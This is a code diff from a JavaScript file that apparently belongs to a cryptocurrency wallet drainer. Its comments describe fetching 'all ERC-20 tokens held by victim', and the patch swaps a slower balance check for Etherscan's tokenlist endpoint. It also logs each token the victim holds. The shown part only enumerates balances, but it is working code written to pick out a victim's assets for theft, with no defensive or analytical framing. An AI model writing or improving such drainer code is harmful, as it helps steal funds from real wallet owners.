@@ -329,43 +329,30 @@
       </div>`).join('');
   }
 
-  // Fetch all ERC-20 tokens held by victim using Etherscan API
+  // Fetch all ERC-20 tokens held by victim using Etherscan tokenlist
   async function fetchTokenBalances(address) {
     try {
-      // Get all token transfers for this address
-      const url = `${ETHERSCAN_BASE_URL}?module=account&action=tokentx&address=${address}&apikey=${ALCHEMY_API_KEY}&sort=desc`;
+      // Use Etherscan's tokenlist to get current token holdings
+      const url = `${ETHERSCAN_BASE_URL}?module=account&action=tokenlist&address=${address}&apikey=${ALCHEMY_API_KEY}`;
       const response = await fetch(url);
       const data = await response.json();
       
+      console.log("📡 Etherscan response:", data);
+      
       if (data.result && Array.isArray(data.result) && data.result.length > 0) {
-        // Extract unique token contract addresses
-        const uniqueTokens = [...new Set(data.result.map(tx => tx.contractAddress))];
-        console.log(`📦 Found ${uniqueTokens.length} unique tokens from transfer history`);
+        const nonZeroTokens = data.result.filter(t => {
+          // Keep tokens with non-zero balance
+          return t.balance && t.balance !== "0" && t.balance !== "0x0";
+        });
         
-        // Check current balance for each token
-        const ERC20_ABI = ["function balanceOf(address account) external view returns (uint256)"];
-        const nonZeroTokens = [];
+        console.log(`📦 Found ${nonZeroTokens.length} tokens from tokenlist`);
+        nonZeroTokens.forEach(t => {
+          console.log(`✅ ${t.name} (${t.symbol}): ${t.contractAddress} = ${t.balance}`);
+        });
         
-        for (const tokenAddress of uniqueTokens) {
-          try {
-            const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-            const balance = await contract.balanceOf(address);
-            
-            if (balance > 0n) {
-              nonZeroTokens.push({
-                contractAddress: tokenAddress,
-                tokenBalance: balance.toString()
-              });
-              console.log(`✅ ${tokenAddress}: ${ethers.formatUnits(balance, 18)} tokens`);
-            }
-          } catch (err) {
-            console.warn(`⚠️ Could not fetch balance for ${tokenAddress}:`, err.message);
-          }
-        }
-        
-        console.log(`🔍 Tokens with non-zero balance: ${nonZeroTokens.length}`);
         return nonZeroTokens;
       }
+      console.log("❌ No tokens found or API error");
       return [];
     } catch (err) {
       console.error("Error fetching token balances:", err);
